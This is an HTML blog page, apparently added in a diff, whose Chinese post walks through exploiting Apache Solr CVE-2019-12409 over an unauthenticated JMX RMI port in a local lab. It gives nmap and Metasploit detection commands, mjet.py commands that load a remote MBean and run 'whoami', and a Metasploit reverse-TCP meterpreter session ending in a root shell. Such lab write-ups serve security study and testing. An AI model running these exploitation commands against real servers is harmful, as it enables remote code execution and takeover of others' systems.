@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="F1v3&#39;s Notes">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="F1v3">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="攻击JMX RMI">
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="F1v3&#39;s Notes">
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="F1v3&#39;s Notes">
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article">
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary">
+    
+
+    <!-- Title -->
+    
+    <title>攻击JMX RMI - F1v3&#39;s Notes</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/blog/1575618238391.html">
+                攻击JMX RMI
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-12-06</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/漏洞/">漏洞</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>以 Apache Solr 远程代码执行(CVE-2019-12409)为例。<br><a id="more"></a></p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载 8.1.1 版本，结果发现在 solr.in.cmd 默认是 <code>false</code> ，只有在 solr.in.sh 默认才是 <code>true</code>，所以只有在 Linux 上才能触发。<br><img src="http://x-f1v3.github.io/images/1575618795308.png" alt="image"><br><img src="http://x-f1v3.github.io/images/1575618883028.png" alt="image"></p>
+<p>在 bin 目录下运行 <code>./solr start</code> 启动 solr<br><img src="http://x-f1v3.github.io/images/1575618943864.png" alt="image"></p>
+<p>可以看到默认情况下 <code>18983</code> 是开启的<br><img src="http://x-f1v3.github.io/images/1575618983432.png" alt="image"></p>
+<h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><p>扫描端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -sV -p 18983 127.0.0.1</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://x-f1v3.github.io/images/1575619076487.png" alt="image"></p>
+<p>如果是未授权的话，可以直接连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jconsole  127.0.0.1:18983</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://x-f1v3.github.io/images/1575619146604.png" alt="image"></p>
+<p>比较奇怪的是，用 msf 检测漏洞是否存在的时候，没有检测出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/misc/java_rmi_server</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://x-f1v3.github.io/images/1575619247197.png" alt="image"></p>
+<p>用 nmap 脚本也没有检测出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=rmi-vuln-classloader -p 18983 127.0.0.1</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://x-f1v3.github.io/images/1575619340303.png" alt="image"></p>
+<p>尴尬….</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="mjet"><a href="#mjet" class="headerlink" title="mjet"></a>mjet</h3><p>下载 <a href="https://github.com/x-f1v3/mjet" target="_blank" rel="noopener">mjet.py</a> 脚本。<br>因为开启的 jmx 服务默认是不需要验证的，所以直接利用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">../jdk1.8/bin/java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 18983 install passwd http://127.0.0.1:8000  8000</span><br><span class="line"></span><br><span class="line">../jdk1.8/bin/java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 18983 command passwd &quot;whoami&quot;</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://x-f1v3.github.io/images/1575619589642.png" alt="image"></p>
+<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>利用 <code>exploit/multi/misc/java_jmx_server</code> 模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use java/meterpreter/reverse_tcp</span><br><span class="line">msf payload(java/meterpreter/reverse_tcp) &gt; set LHOST 127.0.0.1</span><br><span class="line">LHOST =&gt; 127.0.0.1</span><br><span class="line">msf payload(java/meterpreter/reverse_tcp) &gt; set LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf payload(java/meterpreter/reverse_tcp) &gt; use exploit/multi/misc/java_jmx_server</span><br><span class="line">msf exploit(multi/misc/java_jmx_server) &gt; set RHOST 127.0.0.1</span><br><span class="line">RHOST =&gt; 127.0.0.1</span><br><span class="line">msf exploit(multi/misc/java_jmx_server) &gt; set RPORT 18983</span><br><span class="line">RPORT =&gt; 18983</span><br><span class="line">msf exploit(multi/misc/java_jmx_server) &gt; run</span><br><span class="line"></span><br><span class="line">[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?</span><br><span class="line">[*] Started reverse TCP handler on 127.0.0.1:4444 </span><br><span class="line">[*] 127.0.0.1:18983 - Using URL: http://0.0.0.0:8080/ka4B2HQsM</span><br><span class="line">[*] 127.0.0.1:18983 - Local IP: http://172.16.65.171:8080/ka4B2HQsM</span><br><span class="line">[*] 127.0.0.1:18983 - Sending RMI Header...</span><br><span class="line">[*] 127.0.0.1:18983 - Discovering the JMXRMI endpoint...</span><br><span class="line">[+] 127.0.0.1:18983 - JMXRMI endpoint on 127.0.1.1:18983</span><br><span class="line">[*] 127.0.0.1:18983 - Proceeding with handshake...</span><br><span class="line">[+] 127.0.0.1:18983 - Handshake with JMX MBean server on 127.0.1.1:18983</span><br><span class="line">[*] 127.0.0.1:18983 - Loading payload...</span><br><span class="line">[*] 127.0.0.1:18983 - Replied to request for mlet</span><br><span class="line">[*] 127.0.0.1:18983 - Replied to request for payload JAR</span><br><span class="line">[*] 127.0.0.1:18983 - Executing payload...</span><br><span class="line">[*] 127.0.0.1:18983 - Replied to request for payload JAR</span><br><span class="line">[*] Sending stage (53837 bytes) to 127.0.0.1</span><br><span class="line">[*] Meterpreter session 1 opened (127.0.0.1:4444 -&gt; 127.0.0.1:40740) at 2019-12-06 14:20:04 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+<p><img src="http://x-f1v3.github.io/images/1575619715922.png" alt="image"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://www.optiv.com/blog/exploiting-jmx-rmi" target="_blank" rel="noopener">Exploiting JMX RMI</a></li>
+</ul>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/反序列化/">#反序列化</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/blog/1575618238391.html">攻击JMX RMI</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/blog/1573541964775.html">hydra问题</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/blog/1561960885122.html">XXE漏洞</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/blog/1561704300515.html">FastJson反序列化RCE</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/学习/">学习</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/系统环境/">系统环境</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/Java代码审计/">Java代码审计</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/日常姿势/">日常姿势</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.instagram.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://dribbble.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://plus.google.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-google-plus"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.behance.net/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://500px.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
